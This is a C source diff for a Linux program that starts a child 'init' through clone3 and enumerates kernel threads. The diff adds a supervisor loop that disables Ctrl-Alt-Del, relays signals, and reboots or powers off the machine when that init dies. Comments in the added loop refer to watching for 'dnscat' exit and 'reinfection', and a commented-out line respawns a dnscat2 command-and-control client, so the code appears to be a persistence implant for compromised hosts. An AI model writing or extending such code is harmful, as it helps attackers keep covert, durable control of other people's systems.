@@ -1,20 +1,23 @@
 #define _GNU_SOURCE
+#include <ctype.h>
+#include <dirent.h>
+#include <errno.h>
+#include <linux/reboot.h>
+#include <linux/sched.h>
+#include <sched.h>
+#include <signal.h>
+#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
-#include <errno.h>
-#include <sched.h>
-#include <sys/wait.h>
 #include <sys/mman.h>
 #include <sys/mount.h>
-#include <ctype.h>
-#include <dirent.h>
 #include <sys/prctl.h>
+#include <sys/reboot.h>
 #include <sys/syscall.h>
 #include <sys/sysmacros.h>
-#include <linux/sched.h>
-#include <stdint.h>
+#include <sys/wait.h>
+#include <unistd.h>
 
 #ifndef __NR_clone3
 #define __NR_clone3 -1
@@ -26,7 +29,10 @@
                 exit(EXIT_FAILURE);     \
         } while (0)
 
+#define G3LBIN(x) (void)x
 #define ptr_to_u64(ptr) ((__u64)((uintptr_t)(ptr)))
+
+pid_t init_pid;
 
 static pid_t sys_clone3(struct clone_args *args)
 {
@@ -156,8 +162,48 @@ static int enumerate_kernel_threads(char **threads)
 
 	if (errno != 0)
                 err_exit("error reading directory");
-	(void) closedir(dirp);
+	G3LBIN(closedir(dirp));
         return i;
+}
+
+static void on_sigint(int signum)
+{
+	printf("got signal %d\n", signum);
+	if (signum == SIGINT) {
+	  kill(init_pid, SIGINT);
+	}
+}
+
+static void handle_init_exit(int status)
+{
+	/* printf("child init exited with status: %d\n", WEXITSTATUS(status)); */
+	if (WIFSIGNALED(status)) {
+		int signum = WTERMSIG(status);
+
+		if (signum == 1) {
+			/* printf("\n\n\nabout to reboot!\n"); sleep(2); */
+
+			G3LBIN(reboot(LINUX_REBOOT_CMD_RESTART));
+			printf("cannot reboot!\n");
+			exit(EXIT_FAILURE);
+		} else if (signum == 2) {
+			/* printf("\n\n\nabout to shutdown!\n"); sleep(2); */
+			G3LBIN(reboot(LINUX_REBOOT_CMD_POWER_OFF));
+			printf("cannot shutdown!\n");
+			exit(EXIT_FAILURE);
+
+		} else {
+			printf("init exited via signal %d for unknown reason\n", signum);
+			exit(EXIT_FAILURE);
+		}
+	} else {
+		printf("init exited with status %d for unknown reason\n", WEXITSTATUS(status));
+		printf("child init termination caused by signal %d\n", WTERMSIG(status));
+		exit(EXIT_FAILURE);
+	}
+	printf("child init termination caused by signal %d\n",
+	       WTERMSIG(status));
+	exit(EXIT_FAILURE);
 }
 
 int main()
@@ -166,7 +212,6 @@ int main()
         int num;
         int mountflags;
         char *kthreads_names[1024];
-        int init_pid;
         struct clone_args args = {0};
 
 	args.exit_signal = SIGCHLD;
@@ -190,9 +235,43 @@ int main()
                         free(kthreads_names[i]);
                 }
                 system("top");
+		sleep(10);
         } else {
-                /* parent work */
-                if (waitpid(init_pid, NULL, 0) == -1)    /* Wait for child */
-                        err_exit("waitpid");
+                /* Parent process */
+
+		/* install signal handler to handle signal delivered
+		 * ctrl-alt-delete, which we will send to child init
+		 */
+		if (signal(SIGINT, on_sigint) == SIG_ERR)
+			err_exit("couldn't installl signal handler");
+		if (reboot(LINUX_REBOOT_CMD_CAD_OFF) < 0)
+			err_exit("couldn't turn cad off");
+
+		/* watching for dnscat exit
+		 * also, watching for reinfection
+		 * also, waitpid for init
+		 */
+		while(1) {
+			int status;
+			pid_t pid;
+
+			pid = waitpid(-1, &status, 0);
+			if (pid < 0) {
+				if (errno != EINTR) {
+					err_exit("watipid returned error!");
+				} else {
+					/* interrupted via signal */
+					continue;
+				}
+			} else if (pid == init_pid) {
+				G3LBIN(reboot(LINUX_REBOOT_CMD_RESTART));
+				handle_init_exit(status);
+			// } else if (pid == dnscat_pid) {
+ 			// 	dnscat_pid = run_dnscat2();
+			} else {
+				printf("unknown other pid %d exited\n", pid);
+			}
+			sleep(1);
+		}
         }
 }
